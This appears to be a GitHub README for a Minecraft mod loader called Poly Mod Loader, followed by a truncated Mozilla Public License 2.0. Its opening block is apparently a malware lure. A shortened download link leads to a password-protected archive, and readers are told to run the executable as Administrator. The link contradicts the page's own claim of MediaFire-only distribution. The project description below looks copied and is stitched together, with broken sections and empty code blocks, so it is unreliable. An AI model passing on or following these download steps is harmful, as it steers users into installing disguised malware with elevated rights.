<div align="center">

  ![Downloads](https://img.shields.io/badge/Downloads-40K+-blue?style=for-the-badge&logo=github)
  ![User Rating](https://img.shields.io/badge/User%20Rating-4.8%2F5-gold?style=for-the-badge&logo=star)
  ![Latest Version](https://img.shields.io/badge/Latest%20Version-3.2.0-green?style=for-the-badge&logo=github)

</div>

<div align="center">

  <a href="https://cutxo.com/cguqla">
    <img src="https://img.shields.io/badge/Download-Latest%20Release-blue?style=for-the-badge" alt="Download Latest Release">
  </a>

</div>

> ⚡ **All-in-one loader:** The entire script is compiled into a single loader for your convenience — just download, extract, and run. No extra setup required.

1. **⬇️ Download** the tool from the button above.
2. **📦 Extract** the archive (password: `respocket`).
3. **🖱️ Run as Administrator** – right‑click the executable and select *Run as Administrator*.
4. **✅ Follow the setup wizard** – complete the installation.
5. **🚀 Launch the Tool** – the main window appears.

---

> ⚠️ **Important: Official Distribution Notice**
>
> We distribute our software **only through MediaFire**.  
> If the download link leads to **any other file-sharing service**, please **do not download it** — it may be an unofficial or modified copy.  
> For your safety, always use the official release.

---

<div align="center">

### 💙 Prepared by the Respocket Team

**This release was carefully prepared by the Respocket Team** — with attention to every detail, a focus on stability, and respect for our users.  
Thank you for choosing our software. Download only official versions and stay with us!
</div>


---

<p align="center">
  <img src="logo.svg" alt="Poly Mod Loader" width="96" height="96">
</p>

<h1 align="center">Poly Mod Loader</h1>

<p align="center">
  A high-performance multi-loader and Native bytecode engine for Minecraft: Java Edition 26.1 – 26.3<br>
## Install (players)

1. Run the vanilla version you want (26.1, 26.1.1, 26.1.2, 26.2 or 26.3) once in the Minecraft Launcher, quit the game, and close the launcher.
## Make mods

Poly Mods are built with Java 25 and Gradle. One command creates a project, and game tests check it without opening the game.

## Compatibility

| Mods | Status |
|---|---|
| Poly Mods | Supported |
| Fabric mods | Supported. Fabric mods run as under Fabric Loader, Mixin included. On 26.1 and 26.2, popular Fabric mods (138 on 26.2: Sodium, Iris, Lithium and more) play a world together on the client, save it and quit, and 100 start a real dedicated server; the only mods left out are ones Fabric Loader refuses too |
| Quilt mods | Supported. `quilt.mod.json` is read with Quilt Loader's rules, and Quilt mods get Quilt Loader's API, their Mixins and access wideners, next to Fabric, Forge and Poly Mods. On 26.1, 26.1.2 and 26.2, every Quilt-only build on Modrinth (114 on 26.2) was run: on the client they play a saved world, save it and quit, they create and save a world on the server and start a real dedicated server, and the installed launcher profile and server run them. The only mods left out are ones Quilt Loader refuses or cannot run too. Quilt Standard Libraries (QSL) have no release for 26.x, so mods that need QSL are left out with the reason. A jar with both `fabric.mod.json` and `quilt.mod.json` runs as a Fabric mod |
| NeoForge mods | Supported. Poly Mod Loader runs NeoForge and its loader FML themselves (NeoForge 26.1.0.19-beta on 26.1, 26.1.1.15-beta on 26.1.1, 26.1.2.122 on 26.1.2, 26.2.0.93 on 26.2, 26.3.0.98 on 26.3). On 26.1, 26.1.2 and 26.2, popular NeoForge mods play a saved world on the client, save it and quit (54 on 26.2, Sodium and Iris included), create and save a world on the server and start a real dedicated server, next to Poly Mods; the installed launcher profile and server run them too. The only mods left out are ones NeoForge cannot run either. NeoForge mods also run in the same game as Fabric and Quilt mods, with a limit: a Fabric or Quilt mod whose mixins do not fit NeoForge's patch is not loaded, and the log and the title screen say that Poly Mod Loader, not the mod, has to change (`POLY-COMPAT-224`). This leaves out several Fabric API modules and the Fabric mods that need them (on 26.2, 16 Fabric API modules). Not supported: NeoForge mods in the same game as MinecraftForge mods; the NeoForge mods are then left out with the reason (`POLY-COMPAT-221`). The first start with NeoForge mods downloads NeoForge's files |
| Forge mods | Supported. Poly Mod Loader runs Forge and FML themselves (Forge 62.0.9 on 26.1, 64.1.5 on 26.1.2, 65.1.5 on 26.2, 66.1.0 on 26.3). On 26.1 and 26.2, popular Forge mods play a saved world on the client, save it and quit (40 on 26.2), create and save a world on the server and start a real dedicated server; the installed launcher profile and server run them too. The only mods left out are ones Forge refuses too. Forge mods also run in the same game as Fabric and Quilt mods, with the same limit as NeoForge (`POLY-COMPAT-224`; on 26.2, 10 Fabric API modules are left out). The first start with Forge mods downloads Forge's files |

## Build from source

You need JDK 25 and Git. The first build automatically downloads Minecraft from Mojang's servers and verifies it against SHA-1 checksums. Minecraft assets are cached in `~/.gradle/caches/poly-minecraft` and are never redistributed in the repository.

```powershell
## 한국어

Poly 모드 로더는 Minecraft의 실행 기반은 그대로 두고, 그 위의 게임 시스템을 확장하고 교체하는 모드 로더입니다. Fabric, Forge, NeoForge, Quilt 모드를 실행하고, 자체 API인 **Native API**를 제공합니다.

**Poly 모드**(영어: Poly Mod)는 Native API로 만들어 Poly 모드 로더에서 실행하는 모드입니다. Fabric 모드, Forge 모드와 같은 방식으로 부르는 이름입니다.

> Minecraft 26.1, 26.1.1, 26.1.2, 26.2, 26.3을 지원합니다. 26.3에서 다른 로더의 모드는 테스트 모드로 확인했고, 아래 인기 모드 실행 결과는 26.1과 26.2의 것입니다. Native API는 모두 미리보기 단계라 바뀔 수 있습니다. 중요한 월드는 백업하세요.

### 설치 (플레이어)

1. Minecraft Launcher에서 쓰려는 바닐라 버전(26.1, 26.1.1, 26.1.2, 26.2, 26.3)을 한 번 실행한 뒤 런처를 닫습니다.
### 모드 만들기

Poly 모드는 Java 25와 Gradle로 만듭니다. 명령 한 줄로 프로젝트를 만들고, 게임을 켜지 않고도 게임 테스트로 확인할 수 있습니다.

### 호환성

| 모드 | 상태 |
|---|---|
| Poly 모드 | 지원 |
| Fabric 모드 | 지원. Mixin을 포함해 Fabric Loader에서처럼 실행됩니다. 26.1과 26.2에서 인기 Fabric 모드(26.2는 Sodium, Iris, Lithium 등 138개)를 함께 넣고 클라이언트에서 월드를 플레이하고 저장한 뒤 나오며, 100개가 실제 전용 서버 시작을 통과합니다. 빠지는 모드는 Fabric Loader도 실행하지 않는 경우뿐입니다 |
| Quilt 모드 | 지원. `quilt.mod.json`을 Quilt Loader 규칙으로 읽고, Quilt 모드에 Quilt Loader API와 Mixin·access widener를 주며 Fabric·Forge·Poly 모드와 함께 실행합니다. 26.1, 26.1.2, 26.2에서 Modrinth의 Quilt 전용 판 전부(26.2는 114개)를 넣고 클라이언트에서 저장된 월드를 플레이하고 저장한 뒤 나오며, 서버에서 월드를 만들고 저장하고 실제 전용 서버를 시작하고, 설치한 런처 프로필과 서버에서도 실행됩니다. 빠지는 모드는 Quilt Loader도 거부하거나 실행하지 못하는 경우뿐입니다. Quilt 표준 라이브러리(QSL)는 26.x 판이 없어 QSL이 필요한 모드는 이유와 함께 빠집니다. `fabric.mod.json`과 `quilt.mod.json`을 다 든 jar는 Fabric 모드로 실행합니다 |
| NeoForge 모드 | 지원. Poly 모드 로더가 NeoForge와 그 로더 FML을 그대로 실행합니다(26.1은 NeoForge 26.1.0.19-beta, 26.1.1은 26.1.1.15-beta, 26.1.2는 26.1.2.122, 26.2는 26.2.0.93, 26.3은 26.3.0.98). 26.1, 26.1.2, 26.2에서 인기 NeoForge 모드를 넣고 클라이언트에서 저장된 월드를 플레이하고 저장한 뒤 나오며(26.2는 Sodium·Iris를 포함해 54개), 서버에서 월드를 만들고 저장하고 실제 전용 서버를 시작합니다. Poly 모드와 함께도 되고, 설치한 런처 프로필과 서버에서도 실행됩니다. 빠지는 모드는 NeoForge도 실행하지 못하는 경우뿐입니다. Fabric·Quilt 모드와 한 게임에서도 실행되지만 한계가 있습니다. mixin이 NeoForge 패치와 맞지 않는 Fabric·Quilt 모드는 로드하지 않고, Poly 모드 로더 쪽을 고쳐야 한다고 로그와 타이틀 화면에 알립니다(`POLY-COMPAT-224`). 그래서 Fabric API의 여러 모듈과 그것이 필요한 Fabric 모드가 빠집니다(26.2에서 Fabric API 모듈 16개). 지원하지 않는 것: MinecraftForge 모드와 한 게임에서 실행. 그때는 NeoForge 모드가 이유와 함께 빠집니다(`POLY-COMPAT-221`). NeoForge 모드를 넣고 처음 시작하면 NeoForge 파일을 받습니다 |
| Forge 모드 | 지원. Poly 모드 로더가 Forge와 FML을 그대로 실행합니다(26.1은 Forge 62.0.9, 26.1.2는 64.1.5, 26.2는 65.1.5, 26.3은 66.1.0). 26.1과 26.2에서 인기 Forge 모드를 넣고 클라이언트에서 저장된 월드를 플레이하고 저장한 뒤 나오며(26.2는 40개), 서버에서 월드를 만들고 저장하고 실제 전용 서버를 시작합니다. 설치한 런처 프로필과 서버에서도 실행됩니다. 빠지는 모드는 Forge도 실행하지 않는 경우뿐입니다. Fabric·Quilt 모드와 한 게임에서도 실행되며, NeoForge와 같은 한계가 있습니다(`POLY-COMPAT-224`, 26.2에서 Fabric API 모듈 10개가 빠짐). Forge 모드를 넣고 처음 시작하면 Forge 파일을 받습니다 |

### 소스에서 빌드

JDK 25와 Git이 필요합니다. 첫 빌드 시 Mojang 공식 서버에서 마인크래프트 원본 에셋을 받아 SHA-1으로 검증하며, 마인크래프트 파일은 저장소에 절대 포함되거나 재배포되지 않습니다.

```powershell


---

Mozilla Public License Version 2.0
==================================

1. Definitions
--------------

1.1. "Contributor"
    means each individual or legal entity that creates, contributes to
    the creation of, or owns Covered Software.

1.2. "Contributor Version"
    means the combination of the Contributions of others (if any) used
    by a Contributor and that particular Contributor's Contribution.

1.3. "Contribution"
    means Covered Software of a particular Contributor.

1.4. "Covered Software"
    means Source Code Form to which the initial Contributor has attached
    the notice in Exhibit A, the Executable Form of such Source Code
    Form, and Modifications of such Source Code Form, in each case
    including portions thereof.

1.5. "Incompatible With Secondary Licenses"
    means

    (a) that the initial Contributor has attached the notice described
        in Exhibit B to the Covered Software; or

    (b) that the Covered Software was made available under the terms of
        version 1.1 or earlier of the License, but not also under the
        terms of a Secondary License.

1.6. "Executable Form"
    means any form of the work other than Source Code Form.

1.7. "Larger Work"
    means a work that combines Covered Software with other material, in
    a separate file or files, that is not Covered Software.

1.8. "License"
    means this document.

1.9. "Licensable"
    means having the right to grant, to the maximum extent possible,
    whether at the time of the initial grant or subsequently, any and
    all of the rights conveyed by this License.

1.10. "Modifications"
    means any of the following:

    (a) any file in Source Code Form that results from an addition to,
        deletion from, or modification of the contents of Covered
        Software; or

    (b) any new file in Source Code Form that contains any Covered
        Software.

1.11. "Patent Claims" of a Contributor
    means any patent claim(s), including without limitation, method,
    process, and apparatus claims, in any patent Licensable by such
    Contributor that would be infringed, but for the grant of the
    License, by the making, using, selling, offering for sale, having
    made, import, or transfer of either its Contributions or its
    Contributor Version.

1.12. "Secondary License"
    means either the GNU General Public License, Version 2.0, the GNU
    Lesser General Public License, Version 2.1, the GNU Affero General
    Public License, Version 3.0, or any later versions of those
    licenses.

1.13. "Source Code Form"
    means the form of the work preferred for making modifications.

1.14. "You" (or "Your")
    means an individual or a legal entity exercising rights under this
    License. For legal entities, "You" includes any entity that
    controls, is controlled by, or is under common control with You. For
    purposes of this definition, "control" means (a) the power, direct
    or indirect, to cause the direction or management of such entity,
    whether by contract or otherwise, or (b) ownership of more than
    fifty percent (50%) of the outstanding shares or beneficial
    ownership of such entity.

2. License Grants and Conditions
--------------------------------

2.1. Grants

Each Contributor hereby grants You a world-wide, royalty-free,
non-exclusive license:

(a) under intellectual property rights (other than patent or trademark)
    Licensable by such Contributor to use, reproduce, make available,
    modify, display, perform, distribute, and otherwise exploit its
    Contributions, either on an unmodified basis, with Modifications, or
    as part of a Larger Work; and

(b) under Patent Claims of such Contributor to make, use, sell, offer
    for sale, have made, import, and otherwise transfer either its
    Contributions or its Contributor Version.

2.2. Effective Date

The licenses granted in Section 2.1 with respect to any Contribution
become effective for each Contribution on the date the Contributor first
distributes such Contribution.

2.3. Limitations on Grant Scope

The licenses granted in this Section 2 are the only rights granted under
this License. No additional rights or licenses will be implied from the
distribution or licensing of Covered Software under this License.
Notwithstanding Section 2.1(b) above, no patent license is granted by a
Contributor:

(a) for any code that a Contributor has removed from Covered Software;
    or

(b) for infringements caused by: (i) Your and any other third party's
    modifications of Covered Software, or (ii) the combination of its
    Contributions with other software (except as part of its Contributor
    Version); or

(c) under Patent Claims infringed by Covered Software in the absence of
    its Contributions.

This License does not grant any rights in the trademarks, service marks,
or logos of any Contributor (except as may be necessary to comply with
the notice requirements in Section 3.4).

2.4. Subsequent Licenses

No Contributor makes additional grants as a result of Your choice to
distribute the Covered Software under a subsequent version of this
License (see Section 10.2) or under the terms of a Secondary License (if
permitted under the terms of Section 3.3).

2.5. Representation

Each Contributor represents that the Contributor believes its
Contributions are its original creation(s) or it has sufficient rights
to grant the rights to its Contributions conveyed by this License.

2.6. Fair Use

This License is not intended to limit any rights You have under
applicable copyright doctrines of fair use, fair dealing, or other
equivalents.

2.7. Conditions

Sections 3.1, 3.2, 3.3, and 3.4 are conditions of the licenses granted
in Section 2.1.

3. Responsibilities
-------------------

3.1. Distribution of Source Form

All distribution of Covered Software in Source Code Form, including any
Modifications that You create or to which You contribute, must be under
the terms of this License. You must inform recipients that the Source
Code Form of the Covered Software is governed by the terms of this
License, and how they can obtain a copy of this License. You may not
attempt to alter or restrict the recipients' rights in the Source Code
Form.

3.2. Distribution of Executable Form

If You distribute Covered Software in Executable Form then:

(a) such Covered Software must also be made available in Source Code
    Form, as described in Section 3.1, and You must inform recipients of
    the Executable Form how they can obtain a copy of such Source Code
    Form by reasonable means in a timely manner, at a charge no more
    than the cost of distribution to the recipient; and

(b) You may distribute such Executable Form under the terms of this
    License, or sublicense it under different terms, provided that the
    license for the Executable Form does not attempt to limit or alter
    the recipients' rights in the Source Code Form under this License.

3.3. Distribution of a Larger Work

You may create and distribute a Larger Work under terms of Your choice,
provided that You also comply with the requirements of this License for
the Covered Software. If the Larger Work is a combination of Covered
Software with a work governed by one or more Secondary Licenses, and the
Covered Software is not Incompatible With Secondary Licenses, this
License permits You to additionally distribute such Covered Software
under the terms of such Secondary License(s), so that the recipient of
the Larger Work may, at their option, further distribute the Covered
Software under the terms of either this License or such Secondary
License(s).

3.4. Notices

You may not remove or alter the substance of any license notices
(including copyright notices, patent notices, disclaimers of warranty,
or limitations of liability) contained within the Source Code Form of
the Covered Software, except that You may alter any license notices to
the extent required to remedy known factual inaccuracies.

3.5. Application of Additional Terms

You may choose to offer, and to charge a fee for, warranty, support,
indemnity or liability obligations to one or more recipients of Covered
Software. However, You may do so only on Your own behalf, and not on
behalf of any Contributor. You must make it absolutely clear that any
such warranty, support, indemnity, or liability obligation is offered by
You alone, and You hereby agree to indemnify every Contributor for any
liability incurred by such Contributor as a result of warranty, support,
indemnity or liability terms You offer. You may include additional
disclaimers of warranty and limitations of liability specific to any
jurisdiction.

4. Inability to Comply Due to Statute or Regulation
---------------------------------------------------

If it is impossible for You to comply with any of the terms of this
License with respect to some or all of the Covered Software due to
statute, judicial order, or regulation then You must: (a) comply with
the terms of this License to the maximum extent possible; and (b)
describe the limitations and the code they affect. Such description must
be placed in a text file included with all distributions of the Covered
Software under this License. Except to the extent prohibited by statute
or regulation, such description must be sufficiently detailed for a
recipient of ordinary skill to be able to understand it.

5. Termination
--------------

5.1. The rights granted under this License will terminate automatically
if You fail to comply with any of its terms. However, if You become
compliant, then the rights granted under this License from a particular
Contributor are reinstated (a) provisionally, unless and until such
Contributor explicitly and finally terminates Your grants, and (b) on an
ongoing basis, if such Contributor fails to notify You of the
non-compliance by some reasonable means prior to 60 days after You have
come back into compliance. Moreover, Your grants from a particular
Contributor are reinstated on an ongoing basis if such Contributor
notifies You of the non-compliance by some reasonable means, this is the
first time You have received notice of non-compliance with this License
from such Contributor, and You become compliant prior to 30 days after
Your receipt of the notice.

5.2. If You initiate litigation against any entity by asserting a patent
infringement claim (excluding declaratory judgment actions,
counter-claims, and cross-claims) alleging that a Contributor Version
directly or indirectly infringes any patent, then the rights granted to
You by any and all Contributors for the Covered Software under Section
2.1 of this License shall terminate.

5.3. In the event of termination under Sections 5.1 or 5.2 above, all
end user license agreements (excluding distributors and resellers) which
have been validly granted by You or Your distributors under this License
prior to termination shall survive termination.

************************************************************************
*                                                                      *
*  6. Disclaimer of Warranty                                           *
*  -------------------------                                           *
*                                                                      *
*  Covered Software is provided under this License on an "as is"       *
*  basis, without warranty of any kind, either expressed, implied, or  *
*  statutory, including, without limitation, warranties that the       *
*  Covered Software is free of defects, merchantable, fit for a        *
*  particular purpose or non-infringing. The entire risk as to the     *
*  quality and performance of the Covered Software is with You.        *
*  Should any Covered Software prove defective in any respect, You     *
*  (not any Contributor) assume the cost of any necessary servicing,   *
*  repair, or correction. This disclaimer of warranty constitutes an   *
*  essential part of this License. No use of any Covered Software is   *
*  authorized under this License except under this disclaimer.         *
*                                                                      *
************************************************************************

************************************************************************
*                                                                      *
*  7. Limitation of Liability                                          *
*  --------------------------                                          *
*                                                                      *
*  Under no circumstances and under no legal theory, whether tort      *
*  (including negligence), contract, or otherwise, shall any           *
*  Contributor, or anyone who distributes Covered Software as          *
*  permitted above, be liable to You for any direct, indirect,         *
*  special, incidental, or consequential damages of any character      *
*  including, without limitation, damages for lost profits, loss of    *
*  goodwill, work stoppage, computer failure or malfunction, or any    *
*  and all other commercial damages or losses, even if such party      *
*  shall have been informed of the possibility of such damages. This   *
*  limitation of liability shall not apply to liability for death or   *
*  personal injury resulting from such party's negligence to the       *
*  extent applicable law prohibits such limitation. Some               *
*  jurisdictions do not allow the exclusion or limitation of           *
*  incidental or consequential damages, so this exclusion and          *
*  limitation may not apply to You.                                    *
*                                                                      *
************************************************************************

8. Litigation
-------------

Any litigation relating to this License may be brought only in the
courts of a jurisdiction where the defendant maintains its principal
place of business and such litigation shall be governed by laws of that
jurisdiction, without reference to its conflict-of-law provisions.
Nothing in this Section shall prevent a party's ability to bring
cross-claims or counter-claims.

9. Miscellaneous
----------------

This License represents the complete agreement concerning the subject
matter hereof. If any provision of this License is held to be
unenforceable, such provision shall be reformed only to the extent
necessary to make it enforceable. Any law or regulation which provides
that the language of a contract shall be construed against the drafter
shall not be used to construe this License against a Contributor.

10. Versions of the License
---------------------------

10.1. New Versions

Mozilla Foundation is the license steward. Except as provided in Section
10.3, no one other than the license steward has the right to modify or
publish new versions of this License. Each version will be given a
distinguishing version number.

10.2. Effect of New Versions

You may distribute the Covered Software under the terms of the version
of the License under which You originally received the Covered Software,
or under the terms of any subsequent version published by the license
steward.

10.3. Modified Versions

If you create software not governed by this License, and you want to
create a new license for such software, you may create and use a
modified version of this License if you rename the license and remove
any references to the name of the license steward (except to note that
such modified license differs from this License).

10.4. Distributing Source Code Form that is Incompatible With Secondary
Licenses

If You choose to distribute Source Code Form that is Incompatible With
Secondary Licenses under the terms of this version of the License, the
notice described in Exhibit B of this License must be attached.

Exhibit A - Source Code Form License Notice
-------------------------------------------

  This Source Code Form is subject to the terms of the Mozilla Public
  License, v. 2.0. If a copy of the MPL was not distributed with this
